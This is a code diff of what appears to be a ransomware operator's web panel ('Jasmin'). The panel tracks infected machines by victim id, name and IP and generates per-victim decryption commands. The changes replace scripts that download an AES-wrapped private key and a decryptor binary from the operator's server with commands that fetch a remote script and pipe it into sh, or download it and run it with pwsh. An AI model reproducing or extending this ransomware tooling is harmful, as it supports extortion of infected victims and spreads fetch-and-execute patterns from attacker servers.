@@ -231,45 +231,15 @@ $__kfiles = [
 <?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
 <tr><td colspan="11" id="dec-row-<?=$vid?>" class="dec-expand">
 <?php if($is_linux):?>
-<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 私钥AES加密传输
-K="<?=$aes_pwd?>"
-pip3 install -q cryptography 2>/dev/null
-curl -sL <?=$server_url?>/payloads/jasmin_private.pem.enc -o /tmp/.jke
-curl -sL <?=$server_url?>/payloads/jasmin_decrypt.py -o /tmp/.jd
-python3 -c "
-import base64
-from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
-from cryptography.hazmat.backends import default_backend
-raw=base64.b64decode(open('/tmp/.jke').read())
-iv,ct=raw[:16],raw[16:]
-c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
-pt=c.update(ct)+c.finalize()
-open('/tmp/.jk','wb').write(pt[:-pt[-1]])
-"
-python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
+<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 openssl 零依赖
+curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?=$aes_pwd?>" /path/to/decrypt
+# 末尾换成要解密的目录，不写则解密当前目录</pre>
 <?php else:?>
-<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 私钥AES加密传输
-$tmp="$env:TEMP\jasmin_dec"
-New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-$k="<?=$aes_pwd?>"
-Invoke-WebRequest "<?=$server_url?>/payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
-# AES解密私钥
-$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
-$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
-$aes=[System.Security.Cryptography.Aes]::Create()
-$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
-$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
-$dec=$aes.CreateDecryptor()
-$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
-$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
-$sr=New-Object IO.StreamReader($cs)
-[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
-$sr.Close();$cs.Close();$ms.Close()
-# 注: 需先将 Jasmin_Decryptor.exe 放入 payloads/ (仓库未附编译产物)
-Invoke-WebRequest "<?=$server_url?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
-& "$tmp\dec.exe" "$tmp\key.pem"
-Remove-Item -Recurse -Force $tmp</pre>
+<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 PowerShell，无需编译 exe
+:: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)
+curl.exe -sL <?=$server_url?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
+pwsh -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>" -Paths C:\path\to\decrypt
+:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 <?php endif;?>
 </td></tr>
 <?php endif;?>
@@ -397,9 +367,9 @@ function showDecrypt(vid,ip,isLinux){
   var nr=document.createElement('tr');nr.dataset.vid=vid;
   var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
   if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 (私钥AES加密传输)\nK="'+k+'"\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem.enc -o /tmp/.jke\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 -c "\nimport base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes\nfrom cryptography.hazmat.backends import default_backend\nraw=base64.b64decode(open(\\'/tmp/.jke\\').read())\niv,ct=raw[:16],raw[16:]\nc=Cipher(algorithms.AES(bytes.fromhex(\\'$K\\')),modes.CBC(iv),default_backend()).decryptor()\npt=c.update(ct)+c.finalize()\nopen(\\'/tmp/.jk\\',\\'wb\\').write(pt[:-pt[-1]])\n"\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>';
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' \"'+k+'\" /path/to/decrypt\\n# 末尾换成要解密的目录，不写则解密当前目录</pre>';
   }else{
-    td.innerHTML='<pre class="dt-code">$tmp=\\"$env:TEMP\\jasmin_dec\\"\n$k=\\"'+k+'\\"\nNew-Item -ItemType Directory -Force -Path $tmp | Out-Null\nInvoke-WebRequest \\"'+srv+'/payloads/jasmin_private.pem.enc\\" -OutFile \\"$tmp\\key.enc\\"\n$raw=[Convert]::FromBase64String((Get-Content \\"$tmp\\key.enc\\" -Raw))\n$iv=$raw[0..15];$ct=$raw[16..($raw.Length-1)]\n$aes=[System.Security.Cryptography.Aes]::Create()\n$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)\n$aes.IV=[byte[]]$iv;$aes.Padding=\\"PKCS7\\";$aes.Mode=\\"CBC\\"\n$dec=$aes.CreateDecryptor()\n$ms=New-Object IO.MemoryStream(,[byte[]]$ct)\n$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,\\"Read\\")\n$sr=New-Object IO.StreamReader($cs)\n[IO.File]::WriteAllText(\\"$tmp\\key.pem\\",$sr.ReadToEnd())\nInvoke-WebRequest \\"'+srv+'/payloads/Jasmin_Decryptor.exe\\" -OutFile \\"$tmp\\dec.exe\\"\n& \\"$tmp\\dec.exe\\" \\"$tmp\\key.pem\\"\nRemove-Item -Recurse -Force $tmp</pre>';
+    td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+  (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
   }
   nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
